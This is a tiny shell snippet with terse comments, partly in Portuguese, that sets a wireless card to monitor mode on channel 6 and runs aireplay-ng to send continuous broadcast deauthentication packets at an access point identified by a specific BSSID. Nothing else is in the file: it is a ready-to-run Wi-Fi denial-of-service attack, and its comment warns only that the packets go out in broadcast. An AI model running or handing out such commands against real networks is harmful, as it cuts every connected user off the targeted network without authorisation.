# 6 is the channel
# the mac addr is the bssid of the AP
#cuidado pq isso ta em broadcast!!!!!!!!!!
airmon-ng start wlan0 6
aireplay-ng --deauth 0 -a 5C:E3:0E:11:BA:A7  wlan0mon
